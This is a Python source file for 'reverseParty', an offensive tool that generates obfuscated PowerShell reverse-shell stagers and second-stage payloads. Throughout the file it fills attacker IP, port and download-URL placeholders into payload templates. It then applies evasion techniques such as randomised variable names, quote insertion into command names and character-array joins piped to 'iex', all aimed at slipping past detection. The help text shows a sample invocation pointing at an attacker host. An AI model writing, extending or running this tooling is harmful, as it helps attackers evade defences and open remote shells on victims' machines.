#!/usr/bin/env python3
"""
reverseParty.py - PowerShell reverse shell obfuscation tool
Obfuscates stagers and second-stage payloads for red team operations.
"""

import sys
import os
import re
import uuid
import random
import shutil
import argparse

# ─── Base paths ─────────────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ENGINE_DIR = os.path.join(SCRIPT_DIR, "engine")
SECOND_STAGE_DIR = os.path.join(ENGINE_DIR, "second-stage")
STAGER_DIR = os.path.join(ENGINE_DIR, "stager")
OUT_DIR = os.path.join(ENGINE_DIR, "out")
PS_CMD_FILE = os.path.join(ENGINE_DIR, "powershell-cmd", "powershell-cmd.txt")
PS_CMD_NO_PARAM_FILE = os.path.join(ENGINE_DIR, "powershell-cmd", "powershell-cmd-noParametri.txt")


# ════════════════════════════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ════════════════════════════════════════════════════════════════════════════

def generate_random_var_names(count: int = 50) -> list:
    """Generate a pool of random hex variable names using uuid4."""
    return [uuid.uuid4().hex for _ in range(count)]


def load_lines(filepath: str) -> list:
    """Read a file and return stripped, non-empty lines."""
    with open(filepath, "r", encoding="utf-8") as fh:
        return [line.strip() for line in fh if line.strip()]


def obfuscate_variables(content: str, var_pool: list) -> str:
    """
    Find all PowerShell variable assignments ($name=) in content and replace
    them with random hex names. Environment variables are left intact.

    Rules:
      - Must start with '$'
      - Must end with '='
      - The bare word without '$' and '=' is NOT replaced.
    """
    # Find all unique variable names matching $word= pattern
    # Exclude environment variables: they are typically all-uppercase and
    # do not appear as assignment targets in the script body. We use a
    # heuristic: if the token matches an environment variable pattern
    # (all uppercase letters/digits/underscore) we skip it.
    pattern = re.compile(r'\$([A-Za-z_][A-Za-z0-9_]*)\s*=')
    found_vars = list(dict.fromkeys(pattern.findall(content)))  # preserve order, unique

    # Filter out likely environment variable names (all uppercase)
    def is_env_var(name: str) -> bool:
        return name.isupper()

    replaceable = [v for v in found_vars if not is_env_var(v)]

    var_pool_iter = iter(var_pool)
    mapping = {}
    for var in replaceable:
        try:
            mapping[var] = next(var_pool_iter)
        except StopIteration:
            # Replenish pool if exhausted
            mapping[var] = uuid.uuid4().hex

    # Replace occurrences – longer names first to avoid partial replacements
    for original in sorted(mapping.keys(), key=len, reverse=True):
        replacement = mapping[original]
        # Replace $original= (with optional whitespace before =)
        content = re.sub(
            r'\$' + re.escape(original) + r'(\s*=)',
            '$' + replacement + r'\1',
            content
        )
        # Also replace bare usages of $original (without =) that were renamed
        content = re.sub(
            r'\$' + re.escape(original) + r'\b',
            '$' + replacement,
            content
        )

    return content


def method1_obfuscate(cmd: str) -> str:
    """
    Method1: Insert single ('') or double ("") quote pairs between letters.
    At most ONE pair between any two consecutive characters.
    Number of insertions is random (1 up to len(cmd)).
    """
    if len(cmd) < 2:
        return cmd

    chars = list(cmd)
    max_insertions = len(cmd)
    num_insertions = random.randint(1, max_insertions)

    # Choose random positions between characters (indexes 1..len-1)
    positions = sorted(random.sample(range(1, len(chars)), min(num_insertions, len(chars) - 1)))

    result = []
    for i, ch in enumerate(chars):
        result.append(ch)
        if i + 1 in positions:
            result.append(random.choice(["''", '""']))

    return "".join(result)


def method_a_obfuscate(cmd: str) -> str:
    """
    MethodA: ('','c','h','a','r'... -join'')|i''e''x
    """
    chars = "','".join(list(cmd))
    return f"('','{chars}' -join'')|i''e''x"


def method_b_obfuscate(cmd: str) -> str:
    """
    MethodB: $a=@('c','h','a','r'...);i''ex ($a-join'')
    """
    chars = "','".join(list(cmd))
    return f"$a=@('{chars}');i''ex ($a-join'')"


def method_c_obfuscate(cmd: str) -> str:
    """
    MethodC: $h='first_half';$t='second_half';i''e""x ($h+$t)
    """
    mid = len(cmd) // 2
    first = cmd[:mid]
    second = cmd[mid:]
    return f"$h='{first}';$t='{second}';i''e\"\"x ($h+$t)"


def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
    """
    Obfuscate PowerShell commands listed in ps_cmd_file using Method1.
    Commands are matched longest-first.
    Commands starting with '.' are skipped.
    Only the command token is modified; surrounding text is preserved.
    """
    commands = load_lines(ps_cmd_file)
    # Sort by length descending to match longer commands first
    commands.sort(key=len, reverse=True)

    for cmd in commands:
        if cmd.startswith('.'):
            continue
        # Match the command as a whole word (case-insensitive for PS)
        pattern = re.compile(r'(?<![.\w])(' + re.escape(cmd) + r')(?!\w)', re.IGNORECASE)

        def replacer(m):
            return method1_obfuscate(m.group(1))

        content = pattern.sub(replacer, content)

    return content


def obfuscate_ps_no_param_commands(content: str, ps_no_param_file: str) -> str:
    """
    Obfuscate PowerShell no-parameter commands using a randomly chosen method
    (A, B, or C) per command occurrence.
    """
    commands = load_lines(ps_no_param_file)
    commands.sort(key=len, reverse=True)

    methods = [method_a_obfuscate, method_b_obfuscate, method_c_obfuscate]

    for cmd in commands:
        if cmd.startswith('.'):
            continue
        pattern = re.compile(r'(?<![.\w])(' + re.escape(cmd) + r')(?!\w)', re.IGNORECASE)

        def replacer(m, _cmd=cmd):
            chosen = random.choice(methods)
            return chosen(_cmd)

        content = pattern.sub(replacer, content)

    return content


def full_obfuscation(content: str, ps_cmd_file: str, ps_no_param_file: str) -> str:
    """
    Apply the full obfuscation pipeline to a file's content:
      1. Randomise variable names.
      2. Obfuscate PowerShell commands (Method1).
      3. Obfuscate no-parameter commands (random method A/B/C).
    """
    var_pool = generate_random_var_names(100)
    content = obfuscate_variables(content, var_pool)
    content = obfuscate_ps_commands(content, ps_cmd_file)
    content = obfuscate_ps_no_param_commands(content, ps_no_param_file)
    return content


# ════════════════════════════════════════════════════════════════════════════
#  STEP 1 – PARAMETER VALIDATION
# ════════════════════════════════════════════════════════════════════════════

def step1_parse_args() -> argparse.Namespace:
    print("=" * 70)
    print("[STEP 1] Checking and validating input parameters...")
    print("=" * 70)

    parser = argparse.ArgumentParser(
        prog="reverseParty.py",
        description="reverseParty – PowerShell reverse shell obfuscation tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Parameters description:
  --lhost                Public IP to receive the reverse shell connection.
  --lport                Port to listen on for the incoming reverse shell.
  --attacker-url         Full URL from which the second-stage will be downloaded.
  --attacker-second-stage  Filename of the second-stage to be fetched by the stager.
  --win-ip               IP address of the Windows machine used to convert PS1 to EXE.
  --win-user             Username for authenticating to the Windows machine.
  --win-pass             Password for authenticating to the Windows machine.

Example:
  python reverseParty.py \\
      --lhost 203.0.113.1 \\
      --lport 9001 \\
      --attacker-url http://192.168.1.11 \\
      --attacker-second-stage second.txt \\
      --win-ip 192.168.1.10 \\
      --win-user user \\
      --win-pass myPassword
"""
    )

    parser.add_argument("--lhost", required=True,
                        help="Public IP to receive the reverse shell (e.g. 203.0.113.1)")
    parser.add_argument("--lport", required=True,
                        help="Listening port for the reverse shell (e.g. 9001)")
    parser.add_argument("--attacker-url", required=True, dest="attacker_url",
                        help="URL to download second-stage from (e.g. http://192.168.1.11)")
    parser.add_argument("--attacker-second-stage", required=True, dest="attacker_second_stage",
                        help="Second-stage filename (e.g. second.txt)")
    parser.add_argument("--win-ip", required=True, dest="win_ip",
                        help="Windows machine IP for PS1→EXE conversion (e.g. 192.168.1.10)")
    parser.add_argument("--win-user", required=True, dest="win_user",
                        help="Username for the Windows machine")
    parser.add_argument("--win-pass", required=True, dest="win_pass",
                        help="Password for the Windows machine")

    args = parser.parse_args()

    print(f"  [+] LHOST                  : {args.lhost}")
    print(f"  [+] LPORT                  : {args.lport}")
    print(f"  [+] ATTACKER-URL           : {args.attacker_url}")
    print(f"  [+] ATTACKER-SECOND-STAGE  : {args.attacker_second_stage}")
    print(f"  [+] WIN-IP                 : {args.win_ip}")
    print(f"  [+] WIN-USER               : {args.win_user}")
    print(f"  [+] WIN-PASS               : {'*' * len(args.win_pass)}")
    print("[STEP 1] All parameters validated successfully.\n")

    return args


# ════════════════════════════════════════════════════════════════════════════
#  STEP 2 – SECOND-STAGE OBFUSCATION
# ════════════════════════════════════════════════════════════════════════════

def step2_obfuscate_second_stage(args: argparse.Namespace) -> None:
    print("=" * 70)
    print("[STEP 2] Obfuscating second-stage payload...")
    print("=" * 70)

    # 2a. Clear the output directory
    print(f"  [*] Clearing output directory: {OUT_DIR}")
    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)
    print("  [+] Output directory cleared.")

    # 2b. Pick a random second-stage file
    second_stage_files = [
        f for f in os.listdir(SECOND_STAGE_DIR)
        if os.path.isfile(os.path.join(SECOND_STAGE_DIR, f))
    ]
    if not second_stage_files:
        print("  [!] ERROR: No files found in the second-stage directory. Aborting.")
        sys.exit(1)

    chosen_file = random.choice(second_stage_files)
    src_path = os.path.join(SECOND_STAGE_DIR, chosen_file)
    print(f"  [+] Randomly selected second-stage file: {chosen_file}")

    # 2c. Copy to out/ with the name provided by the parameter
    dst_path = os.path.join(OUT_DIR, args.attacker_second_stage)
    shutil.copy2(src_path, dst_path)
    print(f"  [+] Copied to: {dst_path}")

    # 2d. Read content and substitute placeholder variables
    print("  [*] Replacing [ATTACKER-IP] and [ATTACKER-PORT] placeholders...")
    with open(dst_path, "r", encoding="utf-8") as fh:
        content = fh.read()

    content = content.replace("[ATTACKER-IP]", args.lhost)
    content = content.replace("[ATTACKER-PORT]", args.lport)
    print(f"       [ATTACKER-IP]   -> {args.lhost}")
    print(f"       [ATTACKER-PORT] -> {args.lport}")

    # 2e. Full obfuscation pipeline
    print("  [*] Generating random variable name pool...")
    print("  [*] Obfuscating variable names...")
    print("  [*] Obfuscating PowerShell commands (Method1)...")
    print("  [*] Obfuscating no-parameter commands (random method A/B/C)...")
    content = full_obfuscation(content, PS_CMD_FILE, PS_CMD_NO_PARAM_FILE)

    # 2f. Write obfuscated content back
    with open(dst_path, "w", encoding="utf-8") as fh:
        fh.write(content)

    print(f"  [+] Obfuscated second-stage written to: {dst_path}")
    print("[STEP 2] Second-stage obfuscation complete.\n")


# ════════════════════════════════════════════════════════════════════════════
#  STEP 3 – STAGER OBFUSCATION
# ════════════════════════════════════════════════════════════════════════════

def step3_obfuscate_stager(args: argparse.Namespace) -> None:
    print("=" * 70)
    print("[STEP 3] Obfuscating stager...")
    print("=" * 70)

    # 3a. Pick a random stager file
    stager_files = [
        f for f in os.listdir(STAGER_DIR)
        if os.path.isfile(os.path.join(STAGER_DIR, f))
    ]
    if not stager_files:
        print("  [!] ERROR: No files found in the stager directory. Aborting.")
        sys.exit(1)

    chosen_file = random.choice(stager_files)
    src_path = os.path.join(STAGER_DIR, chosen_file)
    print(f"  [+] Randomly selected stager file: {chosen_file}")

    # 3b. Copy to out/ as stager.txt
    dst_path = os.path.join(OUT_DIR, "stager.txt")
    shutil.copy2(src_path, dst_path)
    print(f"  [+] Copied to: {dst_path}")

    # 3c. Read content and substitute placeholder variables
    print("  [*] Replacing [ATTACKER-URL] and [ATTACKER-SECOND-STAGE] placeholders...")
    with open(dst_path, "r", encoding="utf-8") as fh:
        content = fh.read()

    content = content.replace("[ATTACKER-URL]", args.attacker_url)
    content = content.replace("[ATTACKER-SECOND-STAGE]", args.attacker_second_stage)
    print(f"       [ATTACKER-URL]            -> {args.attacker_url}")
    print(f"       [ATTACKER-SECOND-STAGE]   -> {args.attacker_second_stage}")

    # 3d. Full obfuscation pipeline
    print("  [*] Generating random variable name pool...")
    print("  [*] Obfuscating variable names...")
    print("  [*] Obfuscating PowerShell commands (Method1)...")
    print("  [*] Obfuscating no-parameter commands (random method A/B/C)...")
    content = full_obfuscation(content, PS_CMD_FILE, PS_CMD_NO_PARAM_FILE)

    # 3e. Write obfuscated content back
    with open(dst_path, "w", encoding="utf-8") as fh:
        fh.write(content)

    print(f"  [+] Obfuscated stager written to: {dst_path}")
    print("[STEP 3] Stager obfuscation complete.\n")


# ════════════════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════════════════

def main():
    print("\n" + "=" * 70)
    print("          reverseParty.py – Reverse Shell Obfuscation Tool")
    print("=" * 70 + "\n")

    args = step1_parse_args()
    step2_obfuscate_second_stage(args)
    step3_obfuscate_stager(args)

    print("=" * 70)
    print("[DONE] All steps completed successfully.")
    print(f"       Output files are located in: {OUT_DIR}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    main()
